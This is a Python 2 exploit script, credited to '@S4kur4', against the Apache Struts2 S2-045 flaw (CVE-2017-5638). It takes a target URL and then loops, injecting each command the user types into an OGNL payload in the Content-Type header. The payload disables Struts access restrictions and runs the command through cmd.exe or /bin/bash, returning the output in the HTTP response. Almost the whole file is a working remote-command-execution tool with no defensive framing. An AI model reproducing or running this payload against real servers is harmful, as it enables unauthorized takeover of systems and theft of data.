#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Struts2-045(CVE-2017-5638) RCE exp
__author__ = '@S4kur4'
logo = "\033[1;34m"\
       "   _____ _              _       ___  \n"\
       "  / ____| |            | |     |__ \ \n"\
       " | (___ | |_ _ __ _   _| |_ ___   ) |\n"\
       "  \___ \| __| '__| | | | __/ __| / / \n"\
       "  ____) | |_| |  | |_| | |_\__ \/ /_ \n"\
       " |_____/ \__|_|   \__,_|\__|___/____|EXP\033[0m\n"\
       "  Author:\033[0;33mS4kur4\033[0m  Blog:\033[0;33mhttp://0x0c.cc\033[0m"

import urllib2
import sys
import optparse
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

header1 = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "X-Requested-With" : "XMLHttpRequest",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def main():
    register_openers()
    datagen, header2 = multipart_encode({"image1": open("tmp.txt", "rb")})
    command = ""
    print logo
    parser = optparse.OptionParser('Usage: %prog [options]\nExample: %prog -u http://www.test.com/login.action')
    parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
    (options, args) = parser.parse_args()
    if options.target_url==None:
        parser.print_help()
        sys.exit(0)
    else:
        target_url = options.target_url
    target_url = target_url.rstrip('/')
    command = raw_input("\033[1;34m[*]\033[0m Input system command to execute or print 'q' to exit.\n\033[4mCommand\033[0m > ")
    while command != "q":
        header1["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+ command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        header1["Content-Length"] = header2["Content-Length"]
        try:
            request = urllib2.Request(url=target_url, data=datagen, headers=header1)
            response = urllib2.urlopen(request)
            print response.read()
        except Exception, e:
            print "\033[1;31m[-]\033[0m Failed, maybe the site is not vulnerable."
            break
        command = raw_input("\n\033[4mCommand\033[0m > ")

if __name__ == '__main__':
    main()